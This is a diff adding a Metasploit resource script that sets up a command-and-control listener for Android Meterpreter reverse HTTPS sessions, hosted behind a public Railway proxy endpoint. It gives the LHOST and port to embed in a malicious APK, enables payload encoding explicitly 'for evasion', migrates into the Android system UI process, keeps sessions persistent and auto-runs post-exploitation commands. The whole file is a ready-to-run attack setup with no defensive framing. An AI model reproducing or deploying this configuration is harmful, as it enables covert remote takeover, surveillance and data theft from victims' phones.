@@ -1,0 +1,99 @@
+#!/usr/bin/env ruby
+# Professional Handler for Railway Deployment
+# با پیکربندی اختصاصی برای دسترسی از طریق TCP Proxy
+
+use exploit/multi/handler
+
+# ═══════════════════════════════════════════════════════════════
+# PAYLOAD CONFIGURATION - Android Meterpreter HTTPS
+# ═══════════════════════════════════════════════════════════════
+set PAYLOAD android/meterpreter/reverse_https
+
+# ═══════════════════════════════════════════════════════════════
+# RAILWAY NETWORK CONFIGURATION
+# ═══════════════════════════════════════════════════════════════
+# Listen on all interfaces inside Railway container
+set LHOST 0.0.0.0
+
+# Railway TCP Proxy Port - این پورت از خارج قابل دسترسی است
+# Public Access: metro.proxy.rlwy.net:29210
+set LPORT 29210
+
+# Alternative: Internal Railway Network
+# set ReverseListenAddress metasploit-framework1.railway.internal
+# set ReverseListenPort 4444
+
+# ═══════════════════════════════════════════════════════════════
+# SSL/TLS CONFIGURATION - رمزنگاری پیشرفته
+# ═══════════════════════════════════════════════════════════════
+set HandlerSSLCert /root/.msf4/ssl/cert.pem
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+
+# ═══════════════════════════════════════════════════════════════
+# SESSION PERSISTENCE - دسترسی دائمی
+# ═══════════════════════════════════════════════════════════════
+set SessionCommunicationTimeout 0
+set SessionExpirationTimeout 0
+set SessionRetryTotal 100
+set SessionRetryWait 10
+
+# ═══════════════════════════════════════════════════════════════
+# ADVANCED OPTIONS
+# ═══════════════════════════════════════════════════════════════
+# Keep handler running after session establishment
+set ExitOnSession false
+
+# Enable Unicode encoding for evasion
+set EnableUnicodeEncoding true
+
+# Auto-migrate to system process
+set PrependMigrate true
+set PrependMigrateProc com.android.systemui
+
+# ═══════════════════════════════════════════════════════════════
+# AUTO-RUN POST-EXPLOITATION
+# ═══════════════════════════════════════════════════════════════
+set AutoRunScript multi_console_command -rc /root/post_exploit_railway.rc
+
+# ═══════════════════════════════════════════════════════════════
+# VERBOSE LOGGING
+# ═══════════════════════════════════════════════════════════════
+set VERBOSE true
+set ConsoleLogging true
+set LogLevel 3
+
+# ═══════════════════════════════════════════════════════════════
+# START HANDLER IN BACKGROUND
+# ═══════════════════════════════════════════════════════════════
+exploit -j -z
+
+# ═══════════════════════════════════════════════════════════════
+# INFORMATION
+# ═══════════════════════════════════════════════════════════════
+echo ""
+echo "╔══════════════════════════════════════════════════════════════════╗"
+echo "║          🚀 Railway Handler Started Successfully!                ║"
+echo "╚══════════════════════════════════════════════════════════════════╝"
+echo ""
+echo "📡 Public Endpoint:"
+echo "   Domain: metro.proxy.rlwy.net"
+echo "   Port: 29210"
+echo "   Full URL: metro.proxy.rlwy.net:29210"
+echo ""
+echo "🔒 Internal Network:"
+echo "   Service: metasploit-framework1.railway.internal"
+echo "   Port: 4444"
+echo ""
+echo "📱 APK Configuration:"
+echo "   LHOST: metro.proxy.rlwy.net"
+echo "   LPORT: 29210"
+echo "   Protocol: HTTPS"
+echo ""
+echo "✅ Handler is listening on 0.0.0.0:29210"
+echo "✅ Auto-exploitation enabled"
+echo "✅ Session persistence activated"
+echo ""
+echo "⏳ Waiting for incoming connections..."
+echo "═══════════════════════════════════════════════════════════════════"
+echo ""
